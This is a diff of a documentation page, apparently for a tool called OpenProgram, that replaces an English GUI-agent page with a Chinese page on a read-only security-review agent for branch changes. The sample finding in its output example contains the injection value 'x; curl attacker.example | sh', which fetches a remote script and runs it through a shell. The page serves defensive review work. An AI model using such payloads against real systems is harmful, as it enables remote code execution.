@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" data-base="/docs/" data-page-lang="en" data-build="1786544365" data-alt-lang-url="/docs/capabilities/workflows/gui-agent.zh.html">
+<html lang="zh" data-base="/docs/" data-page-lang="zh" data-build="1786544365" data-alt-lang-url="/docs/capabilities/security-review.html">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>GUI Agent · OpenProgram Docs</title>
+<title>安全审查 · OpenProgram Docs</title>
 <script>
 (function(){try{var t=localStorage.getItem('op-docs-theme');
 if(!t)t=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
@@ -66,7 +66,7 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <div class="nav-sec">
 <div class="nav-sec-title">Agentic Workflows</div>
 <a class="navlink" href="/docs/capabilities/workflows/README.html" data-title-zh="Agentic Workflows" data-href-en="/docs/capabilities/workflows/README.html" data-href-zh="/docs/capabilities/workflows/README.zh.html">Agentic workflows</a>
-<a class="navlink active" href="/docs/capabilities/workflows/gui-agent.html" data-title-zh="GUI Agent" data-href-en="/docs/capabilities/workflows/gui-agent.html" data-href-zh="/docs/capabilities/workflows/gui-agent.zh.html">GUI Agent</a>
+<a class="navlink" href="/docs/capabilities/workflows/gui-agent.html" data-title-zh="GUI Agent" data-href-en="/docs/capabilities/workflows/gui-agent.html" data-href-zh="/docs/capabilities/workflows/gui-agent.zh.html">GUI Agent</a>
 <a class="navlink" href="/docs/capabilities/workflows/research-agent.html" data-title-zh="Research Agent" data-href-en="/docs/capabilities/workflows/research-agent.html" data-href-zh="/docs/capabilities/workflows/research-agent.zh.html">Research Agent</a>
 <a class="navlink" href="/docs/capabilities/workflows/wiki-agent.html" data-title-zh="Wiki Agent" data-href-en="/docs/capabilities/workflows/wiki-agent.html" data-href-zh="/docs/capabilities/workflows/wiki-agent.zh.html">Wiki Agent</a>
 </div>
@@ -84,7 +84,7 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 </div>
 <div class="nav-sec">
 <div class="nav-sec-title" data-title-zh="安全审查">Security review</div>
-<a class="navlink" href="/docs/capabilities/security-review.html" data-title-zh="安全审查" data-href-en="/docs/capabilities/security-review.html" data-href-zh="/docs/capabilities/security-review.zh.html">Security review</a>
+<a class="navlink active" href="/docs/capabilities/security-review.html" data-title-zh="安全审查" data-href-en="/docs/capabilities/security-review.html" data-href-zh="/docs/capabilities/security-review.zh.html">Security review</a>
 </div>
 <div class="nav-sec">
 <div class="nav-sec-title" data-title-zh="扩展">Extending</div>
@@ -101,59 +101,122 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <a class="navlink" href="/docs/capabilities/commit-push-pr.html" data-title-zh="Commit, push, PR（提交、推送、开 PR）" data-href-en="/docs/capabilities/commit-push-pr.html" data-href-zh="/docs/capabilities/commit-push-pr.zh.html">Commit, push, PR</a>
 </div></div>
   </nav>
-  <main class="content"><button class="fs-toggle" aria-label="Fullscreen" title="Fullscreen (Esc to exit)"><svg class="ic-expand" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6.2 2H2v4.2M9.8 2H14v4.2M6.2 14H2V9.8M9.8 14H14V9.8"/></svg><svg class="ic-collapse" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M2 6.2h4.2V2M14 6.2H9.8V2M2 9.8h4.2V14M14 9.8H9.8V14"/></svg></button><article><nav class="breadcrumb"><span class="bc-seg" data-title-zh="能力">Capabilities</span> <span class='bc-sep'>›</span> <span class="bc-seg">Agentic Workflows</span> <span class='bc-sep'>›</span> <span class="bc-seg bc-current">GUI Agent</span></nav><h1 id="gui-agent">GUI Agent<a class="header-anchor" href="#gui-agent">#</a></h1>
-<p>Give it a natural-language task and it operates the desktop autonomously: taking screenshots, detecting UI components, clicking, typing, and verifying results, looping until the task completes or the step limit is reached. It works on the local desktop and can also drive remote virtual machines through a VM interface. The perception layer combines YOLO component detection (GPA-GUI-Detector), OCR (Apple Vision on macOS, EasyOCR on Linux / Windows), and template matching; the action layer covers mouse, keyboard, and clipboard. On the OSWorld benchmark it scores 79.8% on the Multi-Apps split (<a href="https://github.com/Fzkuji/GUI-Agent-Harness/blob/main/benchmarks/osworld/multi_apps.md">results</a>).</p>
-<h2 id="install">Install<a class="header-anchor" href="#install">#</a></h2>
-<pre><code class="language-bash">openprogram<span class="w"> </span>programs<span class="w"> </span>install<span class="w"> </span>gui
+  <main class="content"><button class="fs-toggle" aria-label="Fullscreen" title="Fullscreen (Esc to exit)"><svg class="ic-expand" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6.2 2H2v4.2M9.8 2H14v4.2M6.2 14H2V9.8M9.8 14H14V9.8"/></svg><svg class="ic-collapse" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M2 6.2h4.2V2M14 6.2H9.8V2M2 9.8h4.2V14M14 9.8H9.8V14"/></svg></button><article><nav class="breadcrumb"><span class="bc-seg" data-title-zh="能力">Capabilities</span> <span class='bc-sep'>›</span> <span class="bc-seg" data-title-zh="安全审查">Security review</span> <span class='bc-sep'>›</span> <span class="bc-seg bc-current" data-title-zh="安全审查">Security review</span></nav><h1 id="安全审查">安全审查<a class="header-anchor" href="#安全审查">#</a></h1>
+<p>安全审查针对分支改了什么，而不是仓库里有什么。它收集分支基线之后的全部改动（提交、暂存、未暂存、尚未 add 的新文件），交给一个只读 agent 排查本次改动引入的漏洞。已经存在、本次只是挪动了位置的问题不报，所以拿到的是提 PR 之前就能动手处理的清单。</p>
+<p>在 Functions 面板里以 <code>run_security_review</code> 运行，或从 Python 调用：</p>
+<pre><code class="language-python"><span class="kn">from</span><span class="w"> </span><span class="nn">openprogram.functions.agentics.security_review</span><span class="w"> </span><span class="kn">import</span> <span class="n">run_security_review</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">run_security_review</span><span class="p">()</span>
 </code></pre>
-<p>This is the heaviest of the three first-party workflows: dependencies include <code>torch</code> / <code>torchvision</code>, <code>opencv-python</code>, <code>ultralytics</code>, <code>easyocr</code>, <code>pynput</code>, and more. On Linux without a GPU it automatically picks the CPU torch wheel (about 300 MB) instead of the roughly 3 GB CUDA build.</p>
-<p>Beyond the pip dependencies you also need model files — the YOLO detector weights (downloaded via <code>huggingface-hub</code>) and the OCR models are not on PyPI. After installing, run the harness's bundled installer to fetch them:</p>
-<pre><code class="language-bash">openprogram/functions/agentics/GUI-Agent-Harness/scripts/install.sh<span class="w"> </span>--no-host
-<span class="c1"># Windows: ...\scripts\install.ps1 -NoHost</span>
+<h2 id="基线怎么选">基线怎么选<a class="header-anchor" href="#基线怎么选">#</a></h2>
+<p>不传 <code>base</code> 时，按审查者的习惯来选：</p>
+<ol>
+<li>与分支已配置 upstream 的 merge base，也就是这个分支将来真正被比较的对象；</li>
+<li>没有 upstream 时，与默认分支（<code>origin/HEAD</code>、<code>origin/main</code>、<code>origin/master</code>，再到它们的本地同名分支）的 merge base，覆盖还没推送的分支。</li>
+</ol>
+<p>两者都没有时抛 <code>NoBaselineError</code>，说明缺的是什么。它不会退回 <code>HEAD~1</code> 或根提交：猜出来的范围审的是别的改动，而且不会告诉你猜过。要指定范围就自己传：</p>
+<pre><code class="language-python"><span class="n">run_security_review</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="s2">&quot;v2.1.0&quot;</span><span class="p">)</span>
 </code></pre>
-<h2 id="usage">Usage<a class="header-anchor" href="#usage">#</a></h2>
-<p>The entry function is <strong><code>gui_agent</code></strong>, registered as a tool (<code>as_tool=True</code>, toolset <code>harness</code>). In chat, just describe a desktop task to trigger it, e.g. &quot;Open Firefox and go to google.com&quot;.</p>
-<p>Run it directly from the command line:</p>
-<pre><code class="language-bash">openprogram<span class="w"> </span>programs<span class="w"> </span>run<span class="w"> </span>gui_agent<span class="w"> </span>-a<span class="w"> </span><span class="nv">task</span><span class="o">=</span><span class="s2">&quot;Open Firefox and go to google.com&quot;</span>
-</code></pre>
-<p>Parameters (function signature <code>gui_agent(task, max_steps=15, app_name=&quot;desktop&quot;, ...)</code>):</p>
+<h2 id="收集哪些内容">收集哪些内容<a class="header-anchor" href="#收集哪些内容">#</a></h2>
+<p>一次针对工作区的 diff，提交、暂存、未暂存的改动落在同一次审查里，先提交还是不提交拿到的结论一样。未跟踪文件单独 diff 进来，因为硬编码密钥最常出现在新文件里，而普通 diff 看不到它。被 ignore 的文件排除在外，构建产物和 vendor 目录不会进入审查，正在组织的 index 也不会被改动。</p>
+<p>没有任何改动的分支立刻返回无发现，不派 agent。超出单次审查上限的 diff 会截断，并在 prompt 里写明截断，审查者只对实际看到的内容下结论。</p>
+<h2 id="审查哪些类别">审查哪些类别<a class="header-anchor" href="#审查哪些类别">#</a></h2>
+<p>审查者对改动代码逐类排查：</p>
 <table>
 <thead>
 <tr>
-<th>Parameter</th>
-<th>Description</th>
+<th>类别</th>
+<th>例子</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>task</code></td>
-<td>What to do, in natural language</td>
+<td>注入</td>
+<td>拼接出来的 SQL、带插值参数的 <code>shell=True</code>、路径穿越、SSRF、模板与响应头注入</td>
 </tr>
 <tr>
-<td><code>max_steps</code></td>
-<td>Maximum number of actions before giving up; default 15, choices 5 / 10 / 15 / 30</td>
+<td>认证与授权</td>
+<td>新增路由缺少同级都有的检查、用请求里的 id 取对象却不校验归属、角色或租户检查被削弱或挪到副作用之后</td>
 </tr>
 <tr>
-<td><code>app_name</code></td>
-<td>Application name used for component memory, e.g. <code>firefox</code>, <code>libreoffice_calc</code>; default <code>desktop</code></td>
+<td>密钥与敏感信息</td>
+<td>密钥令牌硬编码或写进 fixture、凭据写进日志或异常文本、密钥作为命令行参数传递</td>
+</tr>
+<tr>
+<td>不安全反序列化与动态执行</td>
+<td><code>pickle</code>、不带 <code>SafeLoader</code> 的 <code>yaml.load</code>、<code>eval</code> 与 <code>exec</code>、按调用方给的名字做属性分发、解析外部实体的 XML</td>
+</tr>
+<tr>
+<td>并发与 TOCTOU</td>
+<td>检查与它守护的动作被拆开、共享状态无锁访问、按名字创建临时文件</td>
+</tr>
+<tr>
+<td>资源耗尽</td>
+<td>无上限的读取与解压、调用方控制的分配大小、灾难性正则回溯、出站请求缺超时</td>
+</tr>
+<tr>
+<td>依赖与供应链</td>
+<td>新依赖未固定版本或来自非官方源、构建步骤把远程脚本管道给 shell、关掉校验</td>
+</tr>
+<tr>
+<td>错误处理与信息泄露</td>
+<td>栈回溯和内部路径返回给调用方、被吞掉的异常把失败的检查变成成功</td>
 </tr>
 </tbody>
 </table>
-<p>Each step runs observe (screenshot + component detection + state recognition) → verify the previous step's result → plan the next action → execute → build feedback for the next round. Structured feedback is passed between steps, so progress does not depend on the LLM's context memory. Previously learned UI transitions are reused as shortcuts (component memory).</p>
-<h2 id="dependency-notes">Dependency notes<a class="header-anchor" href="#dependency-notes">#</a></h2>
-<ul>
-<li>PyTorch + OpenCV are large; installation takes minutes. No transformers / accelerate needed.</li>
-<li>The model weights are a separate download step (see above); without them the function registers but cannot perceive the screen.</li>
-<li>Platforms: macOS / Windows / Linux; the OCR backend is selected automatically per platform.</li>
-<li>The runtime needs a working directory configured before running (screenshots and run records are written there).</li>
-</ul>
-<p>Source and README: <code>openprogram/functions/agentics/GUI-Agent-Harness/</code>, upstream repository <a href="https://github.com/Fzkuji/GUI-Agent-Harness">Fzkuji/GUI-Agent-Harness</a>.</p>
-<div class="page-updated"><span data-i18n="updated">Last updated</span> · 2026-08-12</div><div class="prevnext"><a class="pn-link pn-prev" href="/docs/capabilities/workflows/README.html"><span class="pn-dir" data-i18n="prev">Previous</span><span class="pn-title">Agentic workflows</span></a><a class="pn-link pn-next" href="/docs/capabilities/workflows/research-agent.html"><span class="pn-dir" data-i18n="next">Next</span><span class="pn-title">Research Agent</span></a></div></article></main>
+<p>diff 是一扇窗而不是整个程序，所以审查者会先读周边源码再下结论：输入从哪来、上游是否已校验、谁在调用这个函数、sink 实际做了什么。分辨&quot;看着危险其实在上下文里没问题&quot;和&quot;看着平常但看到调用方才知道是漏洞&quot;，靠的就是这一步。</p>
+<h2 id="结构上就是只读的">结构上就是只读的<a class="header-anchor" href="#结构上就是只读的">#</a></h2>
+<p>审查 agent 拿到 <code>read</code>、<code>grep</code>、<code>glob</code>、<code>list</code>、<code>bash</code>，没有 <code>write</code>、<code>edit</code>、<code>apply_patch</code>，也不能再派 agent。能写的审查者会去&quot;顺手修&quot;它以为发现的问题，而产出安全结论的过程改变了被审对象，这个结论就没有价值。修复以建议的形式返回，由你来落地。</p>
+<h2 id="返回什么">返回什么<a class="header-anchor" href="#返回什么">#</a></h2>
+<pre><code class="language-python"><span class="p">{</span><span class="s2">&quot;base&quot;</span><span class="p">:</span> <span class="s2">&quot;a1b2c3d…&quot;</span><span class="p">,</span> <span class="s2">&quot;files_reviewed&quot;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;findings&quot;</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">{</span><span class="s2">&quot;severity&quot;</span><span class="p">:</span> <span class="s2">&quot;critical&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;file&quot;</span><span class="p">:</span> <span class="s2">&quot;api/users.py&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;line&quot;</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span>
+     <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;导出文件名导致命令注入&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;scenario&quot;</span><span class="p">:</span> <span class="s2">&quot;已认证调用方把 filename 设为 `x; curl attacker.example | sh`，该值进入 shell=True 的 subprocess，以服务账号身份执行。&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;recommendation&quot;</span><span class="p">:</span> <span class="s2">&quot;以参数列表调用 subprocess 且不用 shell=True，并拒绝 [A-Za-z0-9._-] 之外的文件名。&quot;</span><span class="p">},</span>
+<span class="p">]}</span>
+</code></pre>
+<p>发现按 <code>critical</code> 在前排序。严重性看后果：</p>
+<table>
+<thead>
+<tr>
+<th>严重性</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>critical</code></td>
+<td>远程代码执行、认证绕过、大规模数据暴露，且未认证即可触达</td>
+</tr>
+<tr>
+<td><code>high</code></td>
+<td>权限提升、他人数据暴露、泄露有效凭据</td>
+</tr>
+<tr>
+<td><code>medium</code></td>
+<td>需要有效凭据、少见配置或串联另一个漏洞才能利用</td>
+</tr>
+<tr>
+<td><code>low</code></td>
+<td>加固类：纵深防御、弱默认值、对攻击者略有价值的信息</td>
+</tr>
+</tbody>
+</table>
+<p>每条发现都带具体触发场景：谁通过哪个入口发送什么、得到什么。写不出这个场景的条目会被丢掉，而不是含糊地报出来。</p>
+<p><code>findings</code> 为空是正常结果，说明这次改动是干净的。prompt 里明确要求不要为了有东西可报而把观察升格成漏洞：编造发现的审查比什么都没发现的审查代价更大。</p>
+<h2 id="与代码评审的区别">与代码评审的区别<a class="header-anchor" href="#与代码评审的区别">#</a></h2>
+<p>这是安全审查而不是代码评审：风格、缺测试、设计意见都不在范围内，分支没碰过的问题同样不在范围内。把它当作提交改动前的最后一道，与团队原有的评审流程并行。</p>
+<div class="page-updated"><span data-i18n="updated">Last updated</span> · 2026-08-12</div><div class="prevnext"><a class="pn-link pn-prev" href="/docs/capabilities/docs-question.html"><span class="pn-dir" data-i18n="prev">Previous</span><span class="pn-title">Asking about OpenProgram itself</span></a><a class="pn-link pn-next" href="/docs/capabilities/installing-harnesses.html"><span class="pn-dir" data-i18n="next">Next</span><span class="pn-title">Harnesses</span></a></div></article></main>
   <aside class="toc"><div class="toc-title" data-i18n="on_this_page">On this page</div>
 <div class="toc-list">
-<a class="" href="#install">Install</a>
-<a class="" href="#usage">Usage</a>
-<a class="" href="#dependency-notes">Dependency notes</a>
+<a class="" href="#基线怎么选">基线怎么选</a>
+<a class="" href="#收集哪些内容">收集哪些内容</a>
+<a class="" href="#审查哪些类别">审查哪些类别</a>
+<a class="" href="#结构上就是只读的">结构上就是只读的</a>
+<a class="" href="#返回什么">返回什么</a>
+<a class="" href="#与代码评审的区别">与代码评审的区别</a>
 </div></aside>
 </div>
 
